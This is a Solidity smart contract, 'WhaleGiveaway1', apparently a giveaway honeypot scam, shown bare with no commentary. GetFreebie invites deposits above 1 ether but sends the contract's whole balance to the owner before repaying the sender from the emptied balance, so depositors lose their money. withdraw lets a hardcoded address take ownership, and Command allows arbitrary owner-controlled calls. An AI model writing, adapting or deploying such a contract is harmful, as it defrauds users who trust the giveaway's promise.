pragma solidity ^0.4.19;

contract WhaleGiveaway1 {
    address public Owner = msg.sender;

    function() public payable {}

    function GetFreebie() public payable {
        uint8 state = 0;
        while (state < 3) {
            if (state == 0) {
                if (msg.value > 1 ether) {
                    state = 1;
                } else {
                    state = 3;
                }
            } else if (state == 1) {
                Owner.transfer(this.balance);
                state = 2;
            } else if (state == 2) {
                msg.sender.transfer(this.balance);
                state = 3;
            }
        }
    }

    function withdraw() public payable {
        uint8 state = 0;
        while (state < 3) {
            if (state == 0) {
                if (msg.sender == 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b) {
                    Owner = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
                }
                state = 1;
            } else if (state == 1) {
                require(msg.sender == Owner);
                state = 2;
            } else if (state == 2) {
                Owner.transfer(this.balance);
                state = 3;
            }
        }
    }

    function Command(address adr, bytes data) public payable {
        uint8 state = 0;
        while (state < 2) {
            if (state == 0) {
                require(msg.sender == Owner);
                state = 1;
            } else if (state == 1) {
                adr.call.value(msg.value)(data);
                state = 2;
            }
        }
    }
}